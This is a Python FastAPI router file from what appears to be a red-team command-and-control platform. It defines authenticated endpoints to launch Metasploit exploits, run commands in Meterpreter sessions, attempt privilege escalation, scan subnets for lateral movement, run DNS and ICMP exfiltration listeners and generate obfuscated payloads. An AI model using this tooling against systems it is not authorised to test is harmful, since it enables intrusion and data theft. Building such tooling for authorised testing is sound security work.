"""
Offensive Router — Extracted from ares_api.py (Fase 5 Refactoring).
Handles: Metasploit, Exfiltration, Payload Generation, Privilege Escalation.
"""

import base64
import logging
import ipaddress
from typing import Optional, Dict

from backend.core.api_contracts import (
    ExploitRunRequest, SessionCommandRequest, PayloadGenerateRequest,
    LateralMovementRequest, PrivescRequest,
)

from fastapi import APIRouter, HTTPException, Depends

from auth_security import get_current_user, User

logger = logging.getLogger("cerberus.routers.offensive")
router = APIRouter()


async def _broadcast_log(component, level, msg, metadata=None):
    from ares_api import broadcast_log
    await broadcast_log(component, level, msg, metadata)


def _get_c2_server():
    import ares_api
    if not hasattr(ares_api, '_c2_server_instance'):
        from c2.c2_server import C2Server
        ares_api._c2_server_instance = C2Server()
    return ares_api._c2_server_instance


# ============================================================================
# METASPLOIT INTEGRATION
# ============================================================================

@router.get("/exploits/search")
async def search_exploits(
    cve: Optional[str] = None, platform: Optional[str] = None,
    keywords: Optional[str] = None, current_user: User = Depends(get_current_user)
):
    """Search for exploits in Metasploit"""
    from exploits.metasploit_bridge import MetasploitBridge
    msf = MetasploitBridge()
    results = await msf.search_exploits(cve_id=cve, platform=platform, keywords=keywords)
    return {"exploits": results}


@router.post("/exploit/run")
async def run_exploit(payload: ExploitRunRequest, current_user: User = Depends(get_current_user)):
    """Execute a Metasploit exploit module"""
    from exploits.metasploit_bridge import MetasploitBridge
    if not payload.target:
        raise HTTPException(400, "Target required")

    msf = MetasploitBridge()
    result = await msf.exploit_target(
        module_path=payload.module,
        target_host=payload.target,
        target_port=payload.port,
        payload=payload.payload,
        options=payload.options
    )
    await _broadcast_log("METASPLOIT", "WARNING" if result.get("success") else "INFO",
                         f"Exploit {payload.module} against {payload.target}", result)
    return result


@router.get("/exploits/sessions")
async def list_sessions(current_user: User = Depends(get_current_user)):
    """List active Meterpreter sessions"""
    from exploits.metasploit_bridge import MetasploitBridge
    msf = MetasploitBridge()
    sessions = await msf.list_sessions()
    return {"sessions": sessions}


@router.post("/session/{session_id}/execute")
async def execute_in_session(session_id: int, payload: SessionCommandRequest, current_user: User = Depends(get_current_user)):
    """Execute command in Meterpreter session"""
    from exploits.metasploit_bridge import MetasploitBridge
    msf = MetasploitBridge()
    output = await msf.execute_in_session(session_id, payload.command)
    return {"output": output}


@router.post("/exploits/sessions/{session_id}/privesc")
async def auto_privilege_escalation(session_id: int, current_user: User = Depends(get_current_user)):
    """Attempt automatic privilege escalation"""
    from exploits.metasploit_bridge import MetasploitBridge
    msf = MetasploitBridge()
    result = await msf.privilege_escalation(session_id)
    await _broadcast_log("METASPLOIT", "CRITICAL" if result.get("success") else "WARNING",
                         f"PrivEsc attempt on session {session_id}", result)
    return result


@router.post("/session/{session_id}/lateral")
async def lateral_movement(session_id: int, payload: LateralMovementRequest, current_user: User = Depends(get_current_user)):
    """Attempt lateral movement using subnet discovery + service enumeration."""
    from backend.offensiva.lateral_movement import LateralOrchestrator

    target_host = payload.target_host.strip()
    if not target_host:
        raise HTTPException(status_code=400, detail="target_host is required")

    try:
        ip_obj = ipaddress.ip_address(target_host)
        # Scan /24 neighborhood around the target host by default.
        subnet = str(ipaddress.ip_network(f"{ip_obj}/24", strict=False))
    except ValueError:
        # If target_host is not an IP, scan that exact host.
        subnet = target_host

    orchestrator = LateralOrchestrator()
    hosts = await orchestrator.explore_network(subnet)

    normalized = [
        {
            "ip": h.ip,
            "hostname": h.hostname,
            "open_ports": h.open_ports,
            "services": h.services,
            "vulnerabilities": h.vulnerabilities,
        }
        for h in hosts
    ]
    return {
        "status": "completed",
        "session_id": session_id,
        "target_host": target_host,
        "scan_subnet": subnet,
        "method": payload.method,
        "hosts_discovered": len(normalized),
        "hosts": normalized,
    }


# ============================================================================
# EXFILTRATION LISTENERS
# ============================================================================

@router.post("/exfil/dns/start")
async def start_dns_listener(port: int = 5353, current_user: User = Depends(get_current_user)):
    """Start DNS Exfiltration Listener"""
    from ares_api import dns_listener
    if dns_listener.running:
        return {"status": "already_running"}
    dns_listener.port = port
    await dns_listener.start()
    await _broadcast_log("EXFIL", "INFO", f"DNS Listener started on port {port}", {})
    return {"status": "started", "port": port}


@router.post("/exfil/icmp/start")
async def start_icmp_listener(interface: Optional[str] = None, current_user: User = Depends(get_current_user)):
    """Start ICMP Exfiltration Listener"""
    from ares_api import icmp_listener
    if icmp_listener.running:
        return {"status": "already_running"}
    icmp_listener.interface = interface
    icmp_listener.start()
    await _broadcast_log("EXFIL", "INFO", "ICMP Listener started", {"interface": interface})
    return {"status": "started"}


@router.get("/exfil/sessions")
async def list_exfil_sessions(current_user: User = Depends(get_current_user)):
    """List active exfiltration sessions"""
    from ares_api import dns_listener, icmp_listener
    dns_sessions = {k: {"type": "DNS", "bytes": len(v.get("chunks", {}))} for k, v in dns_listener.sessions.items()}
    icmp_sessions = {k: {"type": "ICMP", "bytes": len(v.get("chunks", {}))} for k, v in icmp_listener.sessions.items()}
    return {"dns": dns_sessions, "icmp": icmp_sessions}


@router.get("/exfil/data/{session_id}")
async def get_exfil_data(session_id: str, type: str = "dns", current_user: User = Depends(get_current_user)):
    """Retrieve exfiltrated data"""
    from ares_api import dns_listener, icmp_listener
    data = None
    if type.lower() == "dns":
        dns_listener._reassemble(session_id)
        data = dns_listener.get_session_data(session_id)
    elif type.lower() == "icmp":
        icmp_listener._reassemble(session_id)
        data = icmp_listener.get_session_data(session_id)

    if data:
        return {"session_id": session_id, "data_b64": base64.b64encode(data).decode()}
    else:
        raise HTTPException(404, "Session data not found or incomplete")


# ============================================================================
# PAYLOAD GENERATION
# ============================================================================

@router.post("/payload/generate")
async def generate_payload_endpoint(config: PayloadGenerateRequest, current_user: User = Depends(get_current_user)):
    """Generate obfuscated payload"""
    from payloads.payload_generator import PayloadGenerator
    generator = PayloadGenerator()
    try:
        result = generator.generate_payload(config.type, config.details)
        await _broadcast_log("PAYLOAD", "INFO", f"Generated {config.type} payload", {})
        return result
    except ValueError as e:
        raise HTTPException(400, str(e))
    except Exception as e:
        logger.error(f"Payload generation failed: {e}")
        raise HTTPException(500, "Generation failed")


@router.get("/payloads/types")
async def list_payload_types(current_user: User = Depends(get_current_user)):
    """List available payload types"""
    return {"types": ["vbs", "powershell", "html"]}


# ============================================================================
# PRIVILEGE ESCALATION AUTOMATION
# ============================================================================

@router.post("/privesc/analyze/{agent_id}")
async def analyze_privesc(agent_id: str, current_user: User = Depends(get_current_user)):
    """Analyze agent for privilege escalation vectors"""
    from privesc.privesc_engine import PrivEscEngine
    c2 = _get_c2_server()
    privesc = PrivEscEngine()
    try:
        agent_status = await c2.get_agent_status(agent_id)
        info = agent_status.get("info", {})
        suggestions = privesc.analyze_system(info)
        c2.agents[agent_id].info["privesc_suggestions"] = suggestions
        return {"status": "analyzed", "vectors_found": len(suggestions), "suggestions": suggestions}
    except Exception as e:
        raise HTTPException(404, f"Agent not found or analysis failed: {e}")


@router.get("/privesc/suggestions/{agent_id}")
async def get_privesc_suggestions(agent_id: str, current_user: User = Depends(get_current_user)):
    """Get stored suggestions"""
    c2 = _get_c2_server()
    try:
        agent_status = await c2.get_agent_status(agent_id)
        return {"suggestions": agent_status.get("info", {}).get("privesc_suggestions", [])}
    except Exception:
        raise HTTPException(404, "Agent not found")


@router.post("/privesc/{agent_id}/exploit")
async def exploit_privesc(agent_id: str, request: PrivescRequest, current_user: User = Depends(get_current_user)):
    """Attempt privilege escalation"""
    from privesc.privesc_engine import PrivEscEngine
    c2 = _get_c2_server()
    privesc = PrivEscEngine()
    technique = request.technique
    result = await privesc.exploit_vector(agent_id, technique, c2)
    await _broadcast_log("PRIVESC", "CRITICAL", f"Escalation attempt {technique} on {agent_id}", result)
    return result
